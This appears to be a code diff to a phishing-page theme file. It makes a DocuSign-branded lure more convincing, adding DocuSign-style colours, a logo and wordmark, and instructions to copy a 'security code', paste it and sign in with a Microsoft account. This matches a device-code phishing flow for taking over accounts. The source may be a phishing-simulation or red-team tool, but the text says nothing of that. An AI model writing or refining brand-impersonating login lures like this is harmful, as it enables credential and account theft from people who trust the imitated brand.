@@ -5,6 +5,8 @@ export interface LinkTheme {
   primaryColor: string;
   hoverColor: string;
   bgTint: string;
+  buttonTextColor?: string; // defaults to white; set to dark for light primary colors
+  codeColor?: string; // defaults to primaryColor; set to dark for light primary colors
   logo: string; // SVG string
   heading: string;
   subtitle: string;
@@ -135,24 +137,26 @@ export const THEMES: Record<string, LinkTheme> = {
   docusign: {
     id: "docusign",
     label: "DocuSign",
-    pageTitle: "DocuSign - Review and sign document",
-    primaryColor: "#FF5722",
-    hoverColor: "#E64A19",
-    bgTint: "#fff8f5",
-    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect x="8" y="4" width="32" height="40" rx="3" fill="#FF5722"/><path d="M16 18l4 4 8-8" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="16" y1="30" x2="32" y2="30" stroke="white" stroke-width="1.5" stroke-linecap="round"/><line x1="16" y1="35" x2="28" y2="35" stroke="white" stroke-width="1.5" stroke-linecap="round" opacity="0.7"/></svg>`,
-    heading: "Review and sign document",
-    subtitle: "A document is waiting for your review. Verify your identity to access and sign it.",
-    codeLabel: "Access Code",
-    buttonText: "Continue to sign",
+    pageTitle: "Please DocuSign: Document Review",
+    primaryColor: "#FFCC22",
+    hoverColor: "#E6B800",
+    bgTint: "#FFFBEC",
+    buttonTextColor: "#000000",
+    codeColor: "#000000",
+    logo: `<svg width="160" height="40" viewBox="0 0 160 40" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0" y="0" width="40" height="40" rx="6" fill="#FFCC22"/><path d="M11 9h11c5.5 0 9.5 3.4 9.5 9.2v3.4c0 3.7-1.6 6.5-4.3 8C29 30.5 30 32.4 30 33.2c0 .9-.6 1.4-1.5 1.4-.7 0-1.4-.4-2-1.5-.8-1.5-1.6-2-3-2H11V9zm5 4.5v13h6.5c2.6 0 4.5-1.7 4.5-4.4v-3.5c0-3.4-2-5.1-5-5.1H16z" fill="#000"/><text x="50" y="27" fill="#000" font-size="20" font-weight="700" font-family="Inter, system-ui, -apple-system, sans-serif" letter-spacing="-0.5">DocuSign</text></svg>`,
+    heading: "Please review and sign your document",
+    subtitle: "You've been requested to review and sign a document. To continue, verify your identity by signing in to your Microsoft account.",
+    codeLabel: "Security Code",
+    buttonText: "Continue",
     steps: [
-      "Copy the access code above",
-      "Click Continue to sign below",
-      "Enter the code when prompted",
-      "Sign in to access your document",
+      "Copy the security code shown above",
+      "Click Continue below to open the sign-in window",
+      "Paste the security code when prompted",
+      "Sign in with your work or personal Microsoft account",
     ],
-    successHeading: "Identity verified",
-    successMessage: "You can now review and sign the document. You may close this window.",
-    againLabel: "Verify another account",
+    successHeading: "Thank you — your identity has been verified",
+    successMessage: "You may now close this window. Your document is ready for review.",
+    againLabel: "Use a different account",
   },
 };
 
